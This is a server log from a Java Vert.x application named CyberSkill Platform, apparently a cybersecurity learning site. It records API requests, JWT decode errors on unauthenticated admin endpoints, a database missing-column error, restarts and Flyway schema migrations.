2026-03-12 01:24:07.751 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/paths
2026-03-12 01:24:07.754 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.LearningService - Retrieved 7 active learning paths
2026-03-12 01:24:14.667 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /login
2026-03-12 01:24:14.672 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - 📄 GET /login - Rendering login page
2026-03-12 01:24:14.672 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✅ Login page rendered successfully
2026-03-12 01:24:20.167 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /admin
2026-03-12 01:24:20.234 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/admin/analytics/overview
2026-03-12 01:24:20.234 [vert.x-eventloop-thread-1] ERROR com.cyberskill.security.JwtUtil - Error checking token expiration
com.auth0.jwt.exceptions.JWTDecodeException: The token was expected to have 3 parts, but got 0.
	at com.auth0.jwt.TokenUtils.wrongNumberOfParts(TokenUtils.java:45)
	at com.auth0.jwt.TokenUtils.splitToken(TokenUtils.java:23)
	at com.auth0.jwt.JWTDecoder.<init>(JWTDecoder.java:37)
	at com.auth0.jwt.JWTDecoder.<init>(JWTDecoder.java:33)
	at com.auth0.jwt.JWT.decode(JWT.java:52)
	at com.cyberskill.security.JwtUtil.isTokenExpired(JwtUtil.java:126)
	at com.cyberskill.security.JwtUtil.validateAndGetUserId(JwtUtil.java:162)
	at com.cyberskill.security.AuthMiddleware.lambda$requireAuth$0(AuthMiddleware.java:40)
	at io.vertx.ext.web.impl.RouteState.handleContext(RouteState.java:1285)
	at io.vertx.ext.web.impl.RoutingContextImplBase.iterateNext(RoutingContextImplBase.java:177)
	at io.vertx.ext.web.impl.RoutingContextImpl.next(RoutingContextImpl.java:143)
	at com.cyberskill.MainVerticle.lambda$setupGlobalHandlers$0(MainVerticle.java:327)
	at io.vertx.ext.web.impl.RouteState.handleContext(RouteState.java:1285)
	at io.vertx.ext.web.impl.RoutingContextImplBase.iterateNext(RoutingContextImplBase.java:177)
	at io.vertx.ext.web.impl.RoutingContextImpl.next(RoutingContextImpl.java:143)
	at io.vertx.ext.web.handler.impl.TimeoutHandlerImpl.handle(TimeoutHandlerImpl.java:49)
	at io.vertx.ext.web.handler.impl.TimeoutHandlerImpl.handle(TimeoutHandlerImpl.java:27)
	at io.vertx.ext.web.impl.RouteState.handleContext(RouteState.java:1285)
	at io.vertx.ext.web.impl.RoutingContextImplBase.iterateNext(RoutingContextImplBase.java:177)
	at io.vertx.ext.web.impl.RoutingContextImpl.next(RoutingContextImpl.java:143)
	at io.vertx.ext.web.handler.impl.BodyHandlerImpl.handle(BodyHandlerImpl.java:95)
	at io.vertx.ext.web.handler.impl.BodyHandlerImpl.handle(BodyHandlerImpl.java:45)
	at io.vertx.ext.web.impl.RouteState.handleContext(RouteState.java:1285)
	at io.vertx.ext.web.impl.RoutingContextImplBase.iterateNext(RoutingContextImplBase.java:177)
	at io.vertx.ext.web.impl.RoutingContextImpl.next(RoutingContextImpl.java:143)
	at io.vertx.ext.web.handler.impl.CorsHandlerImpl.handle(CorsHandlerImpl.java:205)
	at io.vertx.ext.web.handler.impl.CorsHandlerImpl.handle(CorsHandlerImpl.java:42)
	at io.vertx.ext.web.impl.RouteState.handleContext(RouteState.java:1285)
	at io.vertx.ext.web.impl.RoutingContextImplBase.iterateNext(RoutingContextImplBase.java:177)
	at io.vertx.ext.web.impl.RoutingContextImpl.next(RoutingContextImpl.java:143)
	at io.vertx.ext.web.impl.RouterImpl.handle(RouterImpl.java:68)
	at io.vertx.ext.web.impl.RouterImpl.handle(RouterImpl.java:37)
	at io.vertx.core.http.impl.Http1xServerRequestHandler.handle(Http1xServerRequestHandler.java:67)
	at io.vertx.core.http.impl.Http1xServerRequestHandler.handle(Http1xServerRequestHandler.java:30)
	at io.vertx.core.impl.ContextImpl.emit(ContextImpl.java:335)
	at io.vertx.core.impl.DuplicatedContext.emit(DuplicatedContext.java:176)
	at io.vertx.core.http.impl.Http1xServerConnection.handleMessage(Http1xServerConnection.java:174)
	at io.vertx.core.net.impl.ConnectionBase.read(ConnectionBase.java:159)
	at io.vertx.core.net.impl.VertxHandler.channelRead(VertxHandler.java:153)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:442)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:420)
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:412)
	at io.netty.channel.ChannelInboundHandlerAdapter.channelRead(ChannelInboundHandlerAdapter.java:93)
	at io.netty.handler.codec.http.websocketx.extensions.WebSocketServerExtensionHandler.onHttpRequestChannelRead(WebSocketServerExtensionHandler.java:160)
	at io.netty.handler.codec.http.websocketx.extensions.WebSocketServerExtensionHandler.channelRead(WebSocketServerExtensionHandler.java:83)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:442)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:420)
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:412)
	at io.netty.handler.timeout.IdleStateHandler.channelRead(IdleStateHandler.java:286)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:442)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:420)
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:412)
	at io.netty.handler.codec.MessageToMessageDecoder.channelRead(MessageToMessageDecoder.java:103)
	at io.netty.handler.codec.MessageToMessageCodec.channelRead(MessageToMessageCodec.java:111)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:442)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:420)
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:412)
	at io.netty.handler.codec.ByteToMessageDecoder.fireChannelRead(ByteToMessageDecoder.java:346)
	at io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:318)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:444)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:420)
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:412)
	at io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1410)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:440)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:420)
	at io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:919)
	at io.netty.channel.nio.AbstractNioByteChannel$NioByteUnsafe.read(AbstractNioByteChannel.java:166)
	at io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:788)
	at io.netty.channel.nio.NioEventLoop.processSelectedKeysOptimized(NioEventLoop.java:724)
	at io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:650)
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:562)
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:1447)
2026-03-12 01:24:24.726 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/admin/users
2026-03-12 01:24:24.728 [vert.x-eventloop-thread-1] ERROR com.cyberskill.security.JwtUtil - Error checking token expiration
com.auth0.jwt.exceptions.JWTDecodeException: The token was expected to have 3 parts, but got 0.
	at com.auth0.jwt.TokenUtils.wrongNumberOfParts(TokenUtils.java:45)
	at com.auth0.jwt.TokenUtils.splitToken(TokenUtils.java:23)
	at com.auth0.jwt.JWTDecoder.<init>(JWTDecoder.java:37)
	at com.auth0.jwt.JWTDecoder.<init>(JWTDecoder.java:33)
	at com.auth0.jwt.JWT.decode(JWT.java:52)
	at com.cyberskill.security.JwtUtil.isTokenExpired(JwtUtil.java:126)
	at com.cyberskill.security.JwtUtil.validateAndGetUserId(JwtUtil.java:162)
	at com.cyberskill.security.AuthMiddleware.lambda$requireAuth$0(AuthMiddleware.java:40)
	at io.vertx.ext.web.impl.RouteState.handleContext(RouteState.java:1285)
	at io.vertx.ext.web.impl.RoutingContextImplBase.iterateNext(RoutingContextImplBase.java:177)
	at io.vertx.ext.web.impl.RoutingContextImpl.next(RoutingContextImpl.java:143)
	at com.cyberskill.MainVerticle.lambda$setupGlobalHandlers$0(MainVerticle.java:327)
	at io.vertx.ext.web.impl.RouteState.handleContext(RouteState.java:1285)
	at io.vertx.ext.web.impl.RoutingContextImplBase.iterateNext(RoutingContextImplBase.java:177)
	at io.vertx.ext.web.impl.RoutingContextImpl.next(RoutingContextImpl.java:143)
	at io.vertx.ext.web.handler.impl.TimeoutHandlerImpl.handle(TimeoutHandlerImpl.java:49)
	at io.vertx.ext.web.handler.impl.TimeoutHandlerImpl.handle(TimeoutHandlerImpl.java:27)
	at io.vertx.ext.web.impl.RouteState.handleContext(RouteState.java:1285)
	at io.vertx.ext.web.impl.RoutingContextImplBase.iterateNext(RoutingContextImplBase.java:177)
	at io.vertx.ext.web.impl.RoutingContextImpl.next(RoutingContextImpl.java:143)
	at io.vertx.ext.web.handler.impl.BodyHandlerImpl.handle(BodyHandlerImpl.java:95)
	at io.vertx.ext.web.handler.impl.BodyHandlerImpl.handle(BodyHandlerImpl.java:45)
	at io.vertx.ext.web.impl.RouteState.handleContext(RouteState.java:1285)
	at io.vertx.ext.web.impl.RoutingContextImplBase.iterateNext(RoutingContextImplBase.java:177)
	at io.vertx.ext.web.impl.RoutingContextImpl.next(RoutingContextImpl.java:143)
	at io.vertx.ext.web.handler.impl.CorsHandlerImpl.handle(CorsHandlerImpl.java:205)
	at io.vertx.ext.web.handler.impl.CorsHandlerImpl.handle(CorsHandlerImpl.java:42)
	at io.vertx.ext.web.impl.RouteState.handleContext(RouteState.java:1285)
	at io.vertx.ext.web.impl.RoutingContextImplBase.iterateNext(RoutingContextImplBase.java:177)
	at io.vertx.ext.web.impl.RoutingContextImpl.next(RoutingContextImpl.java:143)
	at io.vertx.ext.web.impl.RouterImpl.handle(RouterImpl.java:68)
	at io.vertx.ext.web.impl.RouterImpl.handle(RouterImpl.java:37)
	at io.vertx.core.http.impl.Http1xServerRequestHandler.handle(Http1xServerRequestHandler.java:67)
	at io.vertx.core.http.impl.Http1xServerRequestHandler.handle(Http1xServerRequestHandler.java:30)
	at io.vertx.core.impl.ContextImpl.emit(ContextImpl.java:335)
	at io.vertx.core.impl.DuplicatedContext.emit(DuplicatedContext.java:176)
	at io.vertx.core.http.impl.Http1xServerConnection.handleMessage(Http1xServerConnection.java:174)
	at io.vertx.core.net.impl.ConnectionBase.read(ConnectionBase.java:159)
	at io.vertx.core.net.impl.VertxHandler.channelRead(VertxHandler.java:153)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:442)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:420)
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:412)
	at io.netty.channel.ChannelInboundHandlerAdapter.channelRead(ChannelInboundHandlerAdapter.java:93)
	at io.netty.handler.codec.http.websocketx.extensions.WebSocketServerExtensionHandler.onHttpRequestChannelRead(WebSocketServerExtensionHandler.java:160)
	at io.netty.handler.codec.http.websocketx.extensions.WebSocketServerExtensionHandler.channelRead(WebSocketServerExtensionHandler.java:83)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:442)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:420)
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:412)
	at io.netty.handler.timeout.IdleStateHandler.channelRead(IdleStateHandler.java:286)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:442)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:420)
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:412)
	at io.netty.handler.codec.MessageToMessageDecoder.channelRead(MessageToMessageDecoder.java:103)
	at io.netty.handler.codec.MessageToMessageCodec.channelRead(MessageToMessageCodec.java:111)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:442)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:420)
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:412)
	at io.netty.handler.codec.ByteToMessageDecoder.fireChannelRead(ByteToMessageDecoder.java:346)
	at io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:318)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:444)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:420)
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:412)
	at io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1410)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:440)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:420)
	at io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:919)
	at io.netty.channel.nio.AbstractNioByteChannel$NioByteUnsafe.read(AbstractNioByteChannel.java:166)
	at io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:788)
	at io.netty.channel.nio.NioEventLoop.processSelectedKeysOptimized(NioEventLoop.java:724)
	at io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:650)
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:562)
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:1447)
2026-03-12 01:24:26.454 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/paths
2026-03-12 01:24:26.456 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.LearningService - Retrieved 7 active learning paths
2026-03-12 01:24:32.404 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/badges
2026-03-12 01:24:32.408 [vert.x-eventloop-thread-1] ERROR c.c.repository.BadgeRepository - Error finding all badges
io.vertx.pgclient.PgException: ERROR: column "is_active" does not exist (42703)
2026-03-12 01:24:32.408 [vert.x-eventloop-thread-1] ERROR com.cyberskill.handler.BadgeHandler - Error getting all badges
io.vertx.pgclient.PgException: ERROR: column "is_active" does not exist (42703)
2026-03-12 01:24:33.463 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/admin/certificates/statistics
2026-03-12 01:24:33.467 [vert.x-eventloop-thread-1] ERROR com.cyberskill.security.JwtUtil - Error checking token expiration
com.auth0.jwt.exceptions.JWTDecodeException: The token was expected to have 3 parts, but got 0.
	at com.auth0.jwt.TokenUtils.wrongNumberOfParts(TokenUtils.java:45)
	at com.auth0.jwt.TokenUtils.splitToken(TokenUtils.java:23)
	at com.auth0.jwt.JWTDecoder.<init>(JWTDecoder.java:37)
	at com.auth0.jwt.JWTDecoder.<init>(JWTDecoder.java:33)
	at com.auth0.jwt.JWT.decode(JWT.java:52)
	at com.cyberskill.security.JwtUtil.isTokenExpired(JwtUtil.java:126)
	at com.cyberskill.security.JwtUtil.validateAndGetUserId(JwtUtil.java:162)
	at com.cyberskill.security.AuthMiddleware.lambda$requireAuth$0(AuthMiddleware.java:40)
	at io.vertx.ext.web.impl.RouteState.handleContext(RouteState.java:1285)
	at io.vertx.ext.web.impl.RoutingContextImplBase.iterateNext(RoutingContextImplBase.java:177)
	at io.vertx.ext.web.impl.RoutingContextImpl.next(RoutingContextImpl.java:143)
	at com.cyberskill.MainVerticle.lambda$setupGlobalHandlers$0(MainVerticle.java:327)
	at io.vertx.ext.web.impl.RouteState.handleContext(RouteState.java:1285)
	at io.vertx.ext.web.impl.RoutingContextImplBase.iterateNext(RoutingContextImplBase.java:177)
	at io.vertx.ext.web.impl.RoutingContextImpl.next(RoutingContextImpl.java:143)
	at io.vertx.ext.web.handler.impl.TimeoutHandlerImpl.handle(TimeoutHandlerImpl.java:49)
	at io.vertx.ext.web.handler.impl.TimeoutHandlerImpl.handle(TimeoutHandlerImpl.java:27)
	at io.vertx.ext.web.impl.RouteState.handleContext(RouteState.java:1285)
	at io.vertx.ext.web.impl.RoutingContextImplBase.iterateNext(RoutingContextImplBase.java:177)
	at io.vertx.ext.web.impl.RoutingContextImpl.next(RoutingContextImpl.java:143)
	at io.vertx.ext.web.handler.impl.BodyHandlerImpl.handle(BodyHandlerImpl.java:95)
	at io.vertx.ext.web.handler.impl.BodyHandlerImpl.handle(BodyHandlerImpl.java:45)
	at io.vertx.ext.web.impl.RouteState.handleContext(RouteState.java:1285)
	at io.vertx.ext.web.impl.RoutingContextImplBase.iterateNext(RoutingContextImplBase.java:177)
	at io.vertx.ext.web.impl.RoutingContextImpl.next(RoutingContextImpl.java:143)
	at io.vertx.ext.web.handler.impl.CorsHandlerImpl.handle(CorsHandlerImpl.java:205)
	at io.vertx.ext.web.handler.impl.CorsHandlerImpl.handle(CorsHandlerImpl.java:42)
	at io.vertx.ext.web.impl.RouteState.handleContext(RouteState.java:1285)
	at io.vertx.ext.web.impl.RoutingContextImplBase.iterateNext(RoutingContextImplBase.java:177)
	at io.vertx.ext.web.impl.RoutingContextImpl.next(RoutingContextImpl.java:143)
	at io.vertx.ext.web.impl.RouterImpl.handle(RouterImpl.java:68)
	at io.vertx.ext.web.impl.RouterImpl.handle(RouterImpl.java:37)
	at io.vertx.core.http.impl.Http1xServerRequestHandler.handle(Http1xServerRequestHandler.java:67)
	at io.vertx.core.http.impl.Http1xServerRequestHandler.handle(Http1xServerRequestHandler.java:30)
	at io.vertx.core.impl.ContextImpl.emit(ContextImpl.java:335)
	at io.vertx.core.impl.DuplicatedContext.emit(DuplicatedContext.java:176)
	at io.vertx.core.http.impl.Http1xServerConnection.handleMessage(Http1xServerConnection.java:174)
	at io.vertx.core.net.impl.ConnectionBase.read(ConnectionBase.java:159)
	at io.vertx.core.net.impl.VertxHandler.channelRead(VertxHandler.java:153)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:442)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:420)
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:412)
	at io.netty.channel.ChannelInboundHandlerAdapter.channelRead(ChannelInboundHandlerAdapter.java:93)
	at io.netty.handler.codec.http.websocketx.extensions.WebSocketServerExtensionHandler.onHttpRequestChannelRead(WebSocketServerExtensionHandler.java:160)
	at io.netty.handler.codec.http.websocketx.extensions.WebSocketServerExtensionHandler.channelRead(WebSocketServerExtensionHandler.java:83)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:442)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:420)
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:412)
	at io.netty.handler.timeout.IdleStateHandler.channelRead(IdleStateHandler.java:286)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:442)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:420)
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:412)
	at io.netty.handler.codec.MessageToMessageDecoder.channelRead(MessageToMessageDecoder.java:103)
	at io.netty.handler.codec.MessageToMessageCodec.channelRead(MessageToMessageCodec.java:111)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:442)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:420)
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:412)
	at io.netty.handler.codec.ByteToMessageDecoder.fireChannelRead(ByteToMessageDecoder.java:346)
	at io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:318)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:444)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:420)
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:412)
	at io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1410)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:440)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:420)
	at io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:919)
	at io.netty.channel.nio.AbstractNioByteChannel$NioByteUnsafe.read(AbstractNioByteChannel.java:166)
	at io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:788)
	at io.netty.channel.nio.NioEventLoop.processSelectedKeysOptimized(NioEventLoop.java:724)
	at io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:650)
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:562)
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:1447)
2026-03-12 01:25:49.713 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Stopping CyberSkill Platform...
2026-03-12 01:25:49.721 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ CyberSkill Platform stopped
2026-03-12 13:42:38.782 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Starting CyberSkill Platform...
2026-03-12 13:42:38.785 [vert.x-eventloop-thread-1] INFO  com.cyberskill.config.AppConfig - Application properties loaded successfully
2026-03-12 13:42:38.925 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Running database migrations...
2026-03-12 13:42:39.082 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - Flyway OSS Edition 10.4.1 by Redgate
2026-03-12 13:42:39.083 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - 
2026-03-12 13:42:39.083 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - See release notes here: https://rd.gt/416ObMi
2026-03-12 13:42:39.104 [vert.x-eventloop-thread-1] INFO  o.f.c.i.r.ResourceNameValidator - 1 SQL migrations were detected but not run because they did not follow the filename convention.
2026-03-12 13:42:39.105 [vert.x-eventloop-thread-1] INFO  o.f.c.i.r.ResourceNameValidator - Set 'validateMigrationNaming' to true to fail fast and see a list of the invalid file names.
2026-03-12 13:42:39.365 [vert.x-eventloop-thread-1] INFO  org.flywaydb.core.FlywayExecutor - Database: jdbc:postgresql://localhost:5432/cyberskill (PostgreSQL 16.3)
2026-03-12 13:42:39.430 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.JdbcTableSchemaHistory - Schema history table "public"."flyway_schema_history" does not exist yet
2026-03-12 13:42:39.435 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbValidate - Successfully validated 4 migrations (execution time 00:00.045s)
2026-03-12 13:42:39.511 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.JdbcTableSchemaHistory - Creating Schema History table "public"."flyway_schema_history" ...
2026-03-12 13:42:39.776 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Current version of schema "public": << Empty Schema >>
2026-03-12 13:42:39.812 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "1 - Initial Schema"
2026-03-12 13:42:40.418 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "2 - Sample Learning Content"
2026-03-12 13:42:40.486 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "3 - Additional Learning Paths"
2026-03-12 13:42:40.518 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "4 - Add Quiz JSONB Support"
2026-03-12 13:42:40.567 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Successfully applied 4 migrations to schema "public", now at version v4 (execution time 00:00.688s)
2026-03-12 13:42:40.572 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Applied 4 database migration(s)
2026-03-12 13:42:40.575 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Initializing database connection pool...
2026-03-12 13:42:40.596 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Database connection pool initialized
2026-03-12 13:42:40.598 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Initializing repositories...
2026-03-12 13:42:40.613 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Repositories initialized
2026-03-12 13:42:40.614 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Initializing services...
2026-03-12 13:42:40.621 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Services initialized
2026-03-12 13:42:40.621 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Initializing handlers...
2026-03-12 13:42:40.626 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Handlers initialized
2026-03-12 13:42:40.835 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ CyberSkill Platform started successfully
2026-03-12 13:42:40.836 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Server listening on http://0.0.0.0:8080
2026-03-12 13:42:40.836 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ API available at http://0.0.0.0:8080/api
2026-03-12 13:42:40.836 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Admin dashboard at http://0.0.0.0:8080/admin
2026-03-12 13:42:40.837 [vert.x-eventloop-thread-0] INFO  i.v.c.i.l.c.VertxIsolatedDeployer - Succeeded in deploying verticle
2026-03-12 13:44:41.530 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Stopping CyberSkill Platform...
2026-03-12 13:44:41.533 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ CyberSkill Platform stopped
2026-03-12 13:44:58.813 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Starting CyberSkill Platform...
2026-03-12 13:44:58.816 [vert.x-eventloop-thread-1] INFO  com.cyberskill.config.AppConfig - Application properties loaded successfully
2026-03-12 13:44:58.911 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Running database migrations...
2026-03-12 13:44:59.016 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - Flyway OSS Edition 10.4.1 by Redgate
2026-03-12 13:44:59.017 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - 
2026-03-12 13:44:59.017 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - See release notes here: https://rd.gt/416ObMi
2026-03-12 13:44:59.187 [vert.x-eventloop-thread-1] INFO  org.flywaydb.core.FlywayExecutor - Database: jdbc:postgresql://localhost:5432/cyberskill (PostgreSQL 16.3)
2026-03-12 13:44:59.235 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.JdbcTableSchemaHistory - Schema history table "public"."flyway_schema_history" does not exist yet
2026-03-12 13:44:59.239 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbValidate - Successfully validated 5 migrations (execution time 00:00.034s)
2026-03-12 13:44:59.258 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.JdbcTableSchemaHistory - Creating Schema History table "public"."flyway_schema_history" ...
2026-03-12 13:44:59.389 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Current version of schema "public": << Empty Schema >>
